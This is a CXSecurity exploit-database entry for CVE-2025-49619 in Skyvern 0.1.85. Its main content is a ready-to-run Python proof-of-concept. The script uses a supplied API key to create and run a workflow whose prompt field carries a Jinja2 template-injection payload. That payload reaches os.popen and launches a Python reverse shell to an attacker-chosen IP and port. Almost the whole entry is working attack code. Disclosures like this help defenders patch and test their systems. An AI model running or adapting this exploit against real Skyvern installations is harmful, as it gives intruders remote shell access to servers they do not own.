---
title: Skyvern 0.1.85 Remote Code Execution (RCE) via SSTI
url: https://cxsecurity.com/issue/WLB-2025060014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-16
fetch_date: 2025-10-06T22:52:11.610600
---

# Skyvern 0.1.85 Remote Code Execution (RCE) via SSTI

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Skyvern 0.1.85 Remote Code Execution (RCE) via SSTI** **2025.06.15**  Credit:  **[Cristian Branet](https://cxsecurity.com/author/Cristian%2BBranet/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-49619](https://cxsecurity.com/cveshow/CVE-2025-49619/ "Click to see CVE-2025-49619")**  CWE: **N/A** | |

# Exploit Title: Skyvern 0.1.85 - Remote Code Execution (RCE) via SSTI
# Date: 2025-06-15
# Exploit Author: Cristian Branet
# Vendor Homepage: https://www.skyvern.com/
# Software Link: https://github.com/Skyvern-AI/skyvern
# Version: < 0.1.85, before commit db856cd
# Tested on: Skyvern Cloud app / Local Skyvern (Linux Ubuntu 22.04)
# CVE : CVE-2025-49619
# Article: https://cristibtz.github.io/posts/CVE-2025-49619/
'''
Skyvern's Workflow Editor allows prompt injection via Jinja2 template syntax.
An attacker with low privileges can inject a malicious payload in a block that contains Prompt section,
which gets rendered server-side, resulting in blind remote code execution via curl.
'''
import requests, argparse, pyfiglet
parser = argparse.ArgumentParser(description="This script exploits CVE-2025-49619 in Skyvern to execute a reverse shell command.", formatter\_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add\_argument("-u", "--url", required=True, help="Skyvern URL (e.g., http://example.com:8080)")
parser.add\_argument("-k", "--x-api-key", required=True, help="Go to Skyvern app -> Settings -> API Key -> Reveal and copy the API key")
parser.add\_argument("-i", "--ip", required=True, help="IP address to receive the reverse shell connection")
parser.add\_argument("-p", "--port", required=True, help="Port for the reverse shell connection")
def create\_exploit\_workflow(url, ip, port, x\_api\_key):
exploit\_workflow = {
"title": "Exploit",
"description": "",
"proxy\_location": "RESIDENTIAL",
"webhook\_callback\_url": "",
"persist\_browser\_session": False,
"model": None,
"totp\_verification\_url": None,
"workflow\_definition": {
"parameters": [],
"blocks": [
{
"label": "block\_1",
"continue\_on\_failure": False,
"block\_type": "task\_v2",
"prompt": (
"{% for x in ().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() %}\n"
" {% if 'warning' in x.\_\_name\_\_ %}\n"
" {{ x().\_module.\_\_builtins\_\_['\_\_import\_\_']('os').popen(\n"
" \"python3 -c 'import socket,os,pty;\"\n"
" \"s=socket.socket();\"\n"
f" \'s.connect((\\\"{ip}\\\",{port}));\'\n"
" \"os.dup2(s.fileno(),0);\"\n"
" \"os.dup2(s.fileno(),1);\"\n"
" \"os.dup2(s.fileno(),2);\"\n"
" \"pty.spawn(\\\"sh\\\")'\"\n"
" ).read() }}\n"
" {% endif %}\n"
"{% endfor %}"
),
"url": "",
"max\_steps": 25,
"totp\_identifier": None,
"totp\_verification\_url": None
}
]
},
"is\_saved\_task": False
}
headers = {
"Content-Type": "application/json",
"X-API-Key": x\_api\_key
}
response = requests.post(f"{url}/api/v1/workflows", json=exploit\_workflow, headers=headers)
if response.status\_code == 200:
print("[+] Exploit workflow created successfully!")
else:
print("[-] Failed to create exploit workflow:", response.text)
return None
workflow\_permanent\_id = response.json().get("workflow\_permanent\_id")
print(f"[+] Workflow Permanent ID: {workflow\_permanent\_id}")
return workflow\_permanent\_id
def run\_exploit\_workflow(url, x\_api\_key, workflow\_permanent\_id):
workflow\_data = {
"workflow\_id": workflow\_permanent\_id
}
headers = {
"Content-Type": "application/json",
"X-API-Key": x\_api\_key
}
response = requests.post(f"{url}/api/v1/workflows/{workflow\_permanent\_id}/run", json=workflow\_data, headers=headers)
if response.status\_code == 200:
print("[+] Exploit workflow executed successfully!")
else:
print("[-] Failed to execute exploit workflow:", response.text)
if \_\_name\_\_=="\_\_main\_\_":
print("\n")
print(pyfiglet.figlet\_format("CVE-2025-49619 PoC", font="small", width=100))
print("Author: Cristian Branet")
print("GitHub: github.com/cristibtz")
print("Description: This script exploits CVE-2025-49619 in Skyvern to execute a reverse shell command.")
print("\n")
args = parser.parse\_args()
url = args.url
x\_api\_key = args.x\_api\_key
ip = args.ip
port = args.port
workflow\_permanent\_id = create\_exploit\_workflow(url, ip, port, x\_api\_key)
run\_exploit\_workflow(url, x\_api\_key, workflow\_permanent\_id)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060014)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top